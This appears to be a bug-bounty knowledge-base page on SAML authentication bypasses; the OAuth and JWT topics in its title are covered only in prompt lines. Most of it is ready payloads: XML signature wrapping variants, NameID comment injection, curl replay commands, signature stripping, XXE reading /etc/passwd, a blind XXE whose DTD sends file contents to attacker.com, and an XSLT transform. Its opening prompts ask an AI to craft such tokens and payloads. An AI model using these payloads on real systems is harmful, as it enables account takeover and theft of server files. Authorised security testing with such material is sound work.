---
id: "oauth-jwt-saml-bypasses"
title: "OAuth / JWT / SAML Auth Bypass Masterclass (2026)"
type: "technique"
category: "web-application"
subcategory: "authentication"
tags: ["oauth", "jwt", "saml", "auth-bypass", "algorithm-confusion", "token", "xxe", "xml-signature-wrapping", "comment-injection", "assertion-replay", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["ssrf-techniques", "idor-bola", "auth-session-attacks", "account-takeover"]
difficulty: "advanced"
updated: "2026-04-14"
---

# OAuth / JWT / SAML Auth Bypass Masterclass (2026)

## Deep Dig Prompts
```
Given this JWT [paste token]: 
Test the following 2026 bypasses and return the exact modified token + steps:
- alg=none
- kid injection / path traversal
- jku / x5u SSRF
- weak HMAC key
```

```
Given this SAML response [paste]: 
Craft XML payloads for XXE, signature wrapping, and assertion replay.
```

## Common Wins
- OAuth redirect URI confusion
- SAML XML signature stripping
- JWT algorithm confusion

---

## SAML Attacks Deep Dive

SAML (Security Assertion Markup Language) is an XML-based SSO protocol. The Service Provider (SP) trusts assertions from the Identity Provider (IdP). Every step of parsing, validating, and consuming SAML assertions is an attack surface.

### SAML Flow (Where to Attack)

```
1. User requests resource on SP
2. SP generates AuthnRequest → redirects user to IdP
3. User authenticates at IdP
4. IdP generates signed SAML Response with Assertion
5. User's browser POSTs the SAML Response to SP's ACS endpoint
6. SP validates signature, extracts NameID, grants access

Attack points:
- Step 2: Tamper AuthnRequest (change AssertionConsumerServiceURL)
- Step 4-5: Intercept and modify SAML Response in transit
- Step 6: Exploit XML parsing differences, signature validation gaps
```

### XML Signature Wrapping (XSW) Attacks

The signature validates one XML element, but the application processes a DIFFERENT one. The attacker moves the signed assertion and inserts an unsigned malicious one where the app looks.

#### XSW1: Clone unsigned Response after Signature

```xml
<samlp:Response>
  <ds:Signature>
    <!-- Signature covers the original Response -->
  </ds:Signature>
  <saml:Assertion ID="original">
    <!-- Signed, legitimate assertion (admin@idp.com) -->
    <saml:Subject>
      <saml:NameID>legitimate@idp.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
<!-- Attacker appends UNSIGNED copy: -->
<samlp:Response>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>attacker@evil.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

#### XSW2: Clone unsigned Response before Signature

```xml
<!-- Attacker's unsigned assertion FIRST -->
<samlp:Response>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>attacker@evil.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
<!-- Original signed response follows -->
<samlp:Response>
  <ds:Signature>...</ds:Signature>
  <saml:Assertion ID="original">
    <saml:Subject>
      <saml:NameID>legitimate@idp.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

#### XSW3: Clone unsigned Assertion before existing Assertion

```xml
<samlp:Response>
  <!-- Attacker's unsigned assertion inserted BEFORE the signed one -->
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>attacker@evil.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
  <ds:Signature>
    <!-- Signature references original Assertion by ID -->
  </ds:Signature>
  <saml:Assertion ID="original-signed">
    <saml:Subject>
      <saml:NameID>legitimate@idp.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

#### XSW4: Clone unsigned Assertion INSIDE existing Assertion

```xml
<samlp:Response>
  <saml:Assertion ID="original-signed">
    <!-- Attacker's assertion NESTED inside the signed one -->
    <saml:Assertion>
      <saml:Subject>
        <saml:NameID>attacker@evil.com</saml:NameID>
      </saml:Subject>
    </saml:Assertion>
    <ds:Signature>...</ds:Signature>
    <saml:Subject>
      <saml:NameID>legitimate@idp.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

#### XSW Testing Steps

```
1. Intercept SAML Response in Burp (at the ACS endpoint POST)
2. Base64-decode the SAMLResponse parameter
3. Use SAML Raider Burp extension → "Send to SAML Raider"
4. Click through XSW1-XSW8 variants automatically
5. For each variant: change NameID in the UNSIGNED assertion to attacker@evil.com
6. Re-encode and forward to SP
7. Check if you're authenticated as the NameID in the unsigned assertion
```

### Comment Injection in NameID

XML comments inside NameID can truncate the parsed value. The XML parser may return only the first text node.

```xml
<!-- Attack: Authenticate as admin@target.com using attacker's IdP account -->

<!-- Legitimate NameID from IdP: -->
<saml:NameID>attacker@evil.com</saml:NameID>

<!-- Attacker modifies to: -->
<saml:NameID>admin@target.com<!--.evil.com--></saml:NameID>

<!-- XML parser sees child nodes:
     Text: "admin@target.com"
     Comment: ".evil.com"
     
     If SP uses first text node → user = admin@target.com → ATO
     
     At the IdP side, the full string admin@target.com<!--.evil.com-->
     is treated as the identifier, which the attacker controls
-->
```

```xml
<!-- Variant: Comment before domain -->
<saml:NameID>admin<!--COMMENT-->@target.com</saml:NameID>
<!-- First text node: "admin" — may match admin user -->

<!-- Variant: Attacker email wrapping victim -->
<saml:NameID>victim@target.com<!---->@attacker.com</saml:NameID>
<!-- First text node: "victim@target.com" → ATO -->
```

**Where this works:** Any SP that uses `.text` or `.firstChild.nodeValue` to extract NameID instead of `.textContent` (which concatenates all text nodes). Affected historically: ruby-saml, python-saml2, many custom implementations.

### Assertion Replay Attack

Capture a valid SAML assertion and replay it later.

```bash
# Step 1: Authenticate legitimately, capture the SAMLResponse
# (Intercept the POST to the ACS endpoint)
SAMLResponse=PHNhbWxwOlJlc3BvbnNlIC...

# Step 2: Base64 decode to check timing conditions
echo "$SAMLResponse" | base64 -d | xmllint --format -
# Look for:
# <saml:Conditions NotBefore="2026-04-14T10:00:00Z" NotOnOrAfter="2026-04-14T10:05:00Z">
# <saml:SubjectConfirmationData NotOnOrAfter="2026-04-14T10:05:00Z">

# Step 3: Replay within the validity window
curl -X POST https://sp.target.com/saml/acs \
  -d "SAMLResponse=$SAMLResponse&RelayState=https://sp.target.com/"

# Step 4: Test replay AFTER expiry — some SPs don't check NotOnOrAfter
curl -X POST https://sp.target.com/saml/acs \
  -d "SAMLResponse=$SAMLResponse"
# If it works → assertion replay vulnerability

# Step 5: Test if InResponseTo is validated
# Remove or change InResponseTo attribute
# If SP accepts → assertions from other sessions can be replayed
```

**Defenses to test for absence:**
- NotOnOrAfter validation
- InResponseTo binding to original AuthnRequest
- One-time use tracking (assertion ID stored and rejected on replay)

### Signature Exclusion / Stripping

Remove the signature entirely and see if the SP accepts unsigned assertions.

```bash
# Step 1: Capture SAMLResponse, base64 decode
# Step 2: Remove the entire <ds:Signature>...</ds:Signature> block
# Step 3: Re-encode and submit

# Also try:
# - Remove SignatureValue content but keep the element
# - Remove Reference/DigestValue but keep Signature structure
# - Change SignatureMethod to an unsupported algorithm
```

```xml
<!-- Original: signed assertion -->
<saml:Assertion>
  <ds:Signature>
    <ds:SignedInfo>...</ds:SignedInfo>
    <ds:SignatureValue>base64sig==</ds:SignatureValue>
  </ds:Signature>
  <saml:Subject>
    <saml:NameID>user@target.com</saml:NameID>
  </saml:Subject>
</saml:Assertion>

<!-- Attack: strip signature, change NameID -->
<saml:Assertion>
  <saml:Subject>
    <saml:NameID>admin@target.com</saml:NameID>
  </saml:Subject>
</saml:Assertion>
```

### SAML to XXE

SAML messages are XML. If the SP's XML parser processes DTDs, you get XXE.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

```xml
<!-- Blind XXE via parameter entities (out-of-band) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://attacker.com/evil.dtd">
  %xxe;
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Subject>
      <saml:NameID>test</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>

<!-- evil.dtd on attacker.com: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

```bash
# PHP-specific XXE (base64 encode file contents to avoid XML parsing errors):
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
```

**Affected libraries (historically):** ruby-saml, pysaml2, SimpleSAMLphp, Spring Security SAML, node-saml/xml-crypto.

### SAML XSLT Attack

If the SP processes XSLT transforms in the signature, inject code execution:

```xml
<ds:Signature>
  <ds:SignedInfo>
    <ds:Reference>
      <ds:Transforms>
        <ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
          <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
            <xsl:template match="/">
              <xsl:value-of select="document('file:///etc/passwd')"/>
            </xsl:template>
          </xsl:stylesheet>
        </ds:Transform>
      </ds:Transforms>
    </ds:Reference>
  </ds:SignedInfo>
</ds:Signature>
```

### SAML Testing Checklist

```
1. Intercept SAML Response at ACS endpoint
2. Test signature stripping (remove <ds:Signature> entirely)
3. Test XSW1-XSW8 (use SAML Raider)
4. Test comment injection in NameID
5. Test XXE in SAMLResponse
6. Test assertion replay (resend old SAMLResponse)
7. Check NotOnOrAfter enforcement (modify timestamps)
8. Check InResponseTo validation (remove/change it)
9. Test NameID format changes (email → persistent → transient)
10. Check if SP accepts assertions for wrong audience (Audience Restriction)
11. Test XSLT injection in Transforms
12. Check if Response vs Assertion signing matters (signed Response with unsigned Assertion)
```

### SAML Tools

- **SAML Raider** — Burp extension, auto-generates XSW variants
- **SAMLTool** — saml-chrome-panel browser extension for intercepting/editing
- **xmlsectool** — Command-line XML signature validation
- **python3-saml** — Build/modify SAML messages programmatically
- **PayloadsAllTheThings/SAML Injection** — Payload reference

**Impact:** Full authentication bypass, login as any user, admin takeover. Payout: $5,000-$50,000+ (critical severity, often eligible for max bounty).
